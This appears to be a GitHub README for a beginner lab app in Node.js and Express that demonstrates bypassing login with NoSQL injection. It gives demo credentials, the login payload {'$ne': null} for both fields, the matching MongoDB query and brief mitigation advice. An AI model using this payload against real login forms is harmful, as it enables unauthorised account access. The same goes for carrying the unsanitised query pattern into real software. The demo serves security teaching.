# 🔓 NoSQL Injection Authentication Bypass

A beginner-friendly demonstration of bypassing login authentication using NoSQL injection techniques in a Node.js Express app.

---

## 🛠 Requirements

- Node.js
- Express.js
- EJS

Install dependencies:
```bash
npm install
```

Run the app:
```bash
node app.js
```

Visit: [http://localhost:3000](http://localhost:3000)

---

## 🐱‍💻 Normal Login

Try with:

```
Username: admin
Password: admin123
```

---

## 💣 NoSQL Injection Payload

Now try login with:

```
Username: {"$ne": null}
Password: {"$ne": null}
```

This payload will match any user where the `username` and `password` are "not equal to null".

---

## 🧠 Why This Works

This simulates how MongoDB queries are evaluated. For example:

```javascript
db.users.find({ username: { "$ne": null }, password: { "$ne": null } })
```

This will return all users, allowing the attacker to bypass authentication.

---

## 🛡️ Mitigation

- Use **input validation** and sanitization libraries like `express-validator`
- Use ORMs like Mongoose that escape values safely
- Never trust user input blindly!

---

## 📁 Author

Rony Khan – [GitHub Profile](https://github.com/Rony4500)
